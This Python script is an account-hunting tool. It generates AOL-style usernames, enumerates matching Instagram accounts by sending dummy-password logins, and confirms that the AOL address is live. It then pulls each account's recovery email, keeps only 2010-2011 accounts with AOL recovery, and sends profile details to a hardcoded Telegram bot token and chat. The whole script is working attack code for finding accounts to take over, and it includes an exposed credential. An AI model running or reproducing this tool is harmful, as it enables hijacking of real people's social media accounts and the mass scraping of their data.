from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time as time_module
from urllib.parse import quote
from datetime import datetime

class qredes:
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        self.bad_recovery = 0
        self.bad_date = 0
        
        # Hardcoded credentials
        self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
        self.id = '7746909110'
        
        print("🚀 Bot starting on Render...")
        
        # Test Telegram connection
        print("Testing Telegram connection...")
        test_msg = "🚀 Bot started on Render! Searching for AOL accounts (2010-2011 ONLY with AOL recovery)"
        self.send_telegram(test_msg)
        print("✅ Telegram test sent!")
        time_module.sleep(2)
        
        # Start threads
        print("Starting search threads...")
        for _ in range(10):
            Thread(target=self.home, daemon=True).start()
        
        # Keep main thread alive
        try:
            while True:
                time_module.sleep(60)
                print(f"Status: 🎯 Hits: {self.hits} | ❌ Bad IG: {self.bad_instgram} | ✉️ Bad Email: {self.bad_email} | ✅ Good IG: {self.good_insgram} | 📧 Bad Recovery: {self.bad_recovery} | 📅 Bad Date: {self.bad_date}")
        except KeyboardInterrupt:
            print("Bot stopped by user")
    
    def send_telegram(self, message):
        """Send message to Telegram with proper URL encoding"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                encoded_message = quote(message)
                url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    return True
                else:
                    print(f"Telegram error: {response.status_code}")
            except Exception as e:
                print(f"Telegram attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time_module.sleep(1)
        return False
    
    def insta1(self, email):
        try:
            csrftoken = md5(str(time()).encode()).hexdigest()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36',
                'x-csrftoken': csrftoken,
            }
            data = {
                'username': email,
            }
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
            if 'showAccountRecoveryModal' in response:
                return True
            else:
                return False
        except:
            return False
    
    def insta2(self, email):
        try:
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                'Accept': '*/*',
                'Cookie': 'missing',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com'
            }
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data, timeout=10).text
            if 'bad_password' in re:
                return True
            else:
                return False
        except:
            return False
    
    def check_aol_real(self, email):
        """Actually check if AOL email exists"""
        try:
            username = email.split('@')[0]
            
            headers = {
                'User-Agent': generate_user_agent(),
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://login.aol.com',
                'Referer': 'https://login.aol.com/',
            }
            
            url = 'https://login.aol.com/account/challenge/password'
            data = {
                'username': username,
                'passwd': 'wrongpassword123',
            }
            
            response = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False)
            response_text = response.text.lower()
            
            if 'doesn\'t exist' in response_text or 'invalid id' in response_text or 'account not found' in response_text:
                return False
            elif 'password' in response_text or 'incorrect' in response_text:
                return True
            
            return True
            
        except Exception as e:
            return False
    
    def check_post_dates(self, username):
        """Check if account has posts and verify they're from 2010-2011"""
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
            }
            
            params = {
                'username': username,
            }
            
            response = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                params=params,
                headers=headers,
                timeout=10
            ).json()
            
            posts = response.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
            
            if len(posts) == 0:
                return True, "No posts"
            
            for post in posts[:12]:
                timestamp = post.get('node', {}).get('taken_at_timestamp', 0)
                if timestamp > 0:
                    post_date = datetime.fromtimestamp(timestamp)
                    post_year = post_date.year
                    
                    if post_year > 2011:
                        return False, f"Post found from {post_year}"
            
            return True, "All posts from 2010-2011"
            
        except Exception as e:
            return True, "Could not verify posts"
    
    def get_info(self, username, domen):
        try:
            headers = {
                'X-Pigeon-Session-Id': str(uuid4()),
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com',
            }
            
            rest = None
            try:
                csrftoken = md5(str(time()).encode()).hexdigest()
                headers_recovery = {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                    'Accept': '*/*',
                    'Cookie': f'csrftoken={csrftoken}',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-CSRFToken': csrftoken,
                }
                data = {
                    'signed_body': f'SIGNATURE.{{"query":"{username}"}}',
                    'ig_sig_key_version': '4',
                }
                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
                                        headers=headers_recovery, data=data, timeout=10)
                result = response.json()
                rest = result.get('email', None)
                
                if rest and '@aol.com' not in rest.lower():
                    print(f"❌ Skipping {username} - Recovery is {rest}, not AOL")
                    self.bad_recovery += 1
                    return False
                    
            except Exception as e:
                print(f"Could not get recovery email for {username}: {e}")
                return False
            
            if not rest:
                print(f"❌ No recovery email found for {username}")
                self.bad_recovery += 1
                return False
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'referer': f'https://www.instagram.com/{username}/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
            }
            params = {
                'username': username,
            }
            
            response = None
            try:
                response = requests.get(
                    'https://www.instagram.com/api/v1/users/web_profile_info/',
                    params=params,
                    headers=headers,
                    timeout=10
                ).json()
            except:
                pass
            
            id = None
            followerNum = None
            followingNum = None
            postNum = None
            isPraise = None
            full_name = None
            biography = None
            date = None
            
            if response:
                try:
                    id = response['data']['user']['id']
                    followerNum = response['data']['user']['edge_followed_by']['count']
                    followingNum = response['data']['user']['edge_follow']['count']
                    postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
                    isPraise = response['data']['user']['is_private']
                    full_name = response['data']['user']['full_name']
                    biography = response['data']['user']['biography']
                except:
                    pass
            
            if id:
                try:
                    date_resp = requests.get(f'https://mel7n.pythonanywhere.com/?id={id}', timeout=5).json()
                    date = date_resp.get('date', None)
                    
                    if date:
                        try:
                            year = int(date.split('-')[0])
                            if year < 2010 or year > 2011:
                                print(f"❌ Skipping {username} - Created in {year}, not 2010-2011")
                                self.bad_date += 1
                                return False
                        except:
                            pass
                except:
                    pass
            
            posts_valid, posts_msg = self.check_post_dates(username)
            if not posts_valid:
                print(f"❌ Skipping {username} - {posts_msg}")
                self.bad_date += 1
                return False
            
            info = f'''═══════════════════════════
🎯 HIT FOUND by PRIME! 🎯
═══════════════════════════
📧 Email: {username}@{domen}
👤 Username: {username}
🔗 Instagram: https://instagram.com/{username}
👥 Followers: {followerNum}
👣 Following: {followingNum}
📸 Posts: {postNum}
🔒 Private: {isPraise}
📅 Created: {date}
🆔 ID: {id}
📝 Name: {full_name}
💬 Bio: {biography}
📩 Recovery: {rest}
✅ Posts: {posts_msg}
═══════════════════════════
by: @m0hsvn'''
            
            print(info)
            
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(info + '\n')
            
            self.send_telegram(info)
            return True
            
        except Exception as e:
            print(f"Error in get_info: {e}")
            return False
    
    def get_username(self):
        """Generate random username from AOL accounts 2010-2011"""
        try:
            first_names = ['john', 'mike', 'sarah', 'emma', 'david', 'james', 'mary', 'lisa', 
                          'chris', 'alex', 'ryan', 'kevin', 'brian', 'mark', 'matt', 'josh',
                          'dan', 'tom', 'sam', 'ben', 'anna', 'kate', 'amy', 'lily', 'emily',
                          'jake', 'luke', 'paul', 'eric', 'adam', 'nick', 'steve', 'jeff',
                          'tyler', 'brandon', 'justin', 'jason', 'ashley', 'jessica', 'amanda']
            
            last_names = ['smith', 'johnson', 'brown', 'davis', 'miller', 'wilson', 'moore',
                         'taylor', 'anderson', 'thomas', 'jackson', 'white', 'harris', 'martin',
                         'thompson', 'garcia', 'martinez', 'robinson', 'clark', 'rodriguez',
                         'lewis', 'walker', 'hall', 'allen', 'young', 'king', 'wright', 'scott']
            
            years = ['10', '11', '2010', '2011']
            numbers = [str(i) for i in range(1, 100)]
            
            pattern = randrange(1, 9)
            
            if pattern == 1:
                username = f"{choice(first_names)}.{choice(last_names)}"
            elif pattern == 2:
                username = f"{choice(first_names)}{choice(last_names)}"
            elif pattern == 3:
                username = f"{choice(first_names)}{choice(years)}"
            elif pattern == 4:
                username = f"{choice(first_names)}{choice(numbers)}"
            elif pattern == 5:
                username = f"{choice(first_names)}.{choice(last_names)}{choice(years)}"
            elif pattern == 6:
                username = f"{choice(first_names)}_{choice(last_names)}"
            elif pattern == 7:
                username = f"{choice(last_names)}{choice(numbers)}"
            else:
                username = f"{choice(first_names)}{choice(last_names)}{choice(numbers)}"
            
            return [username]
        except Exception as e:
            print(f"Error generating username: {e}")
            return None
    
    def home(self):
        while True:
            try:
                usernames = None
                while usernames is None:
                    try:
                        usernames = self.get_username()
                    except:
                        time_module.sleep(0.5)
                
                for username in usernames:
                    api = choice(['1', '2'])
                    email = username + '@aol.com'
                    
                    if '1' == api:
                        s = self.insta1(email)
                    else:
                        s = self.insta2(email)
                    
                    if s == True:
                        self.good_insgram += 1
                        qq = self.check_aol_real(email)
                        if qq == True:
                            result = self.get_info(username, 'aol.com')
                            if result:
                                self.hits += 1
                        else:
                            self.bad_email += 1
                    else:
                        self.bad_instgram += 1
                    
                    time_module.sleep(0.3)
                    
            except Exception as e:
                print(f"Error in home: {e}")
                time_module.sleep(1)

if __name__ == '__main__':
    qredes()
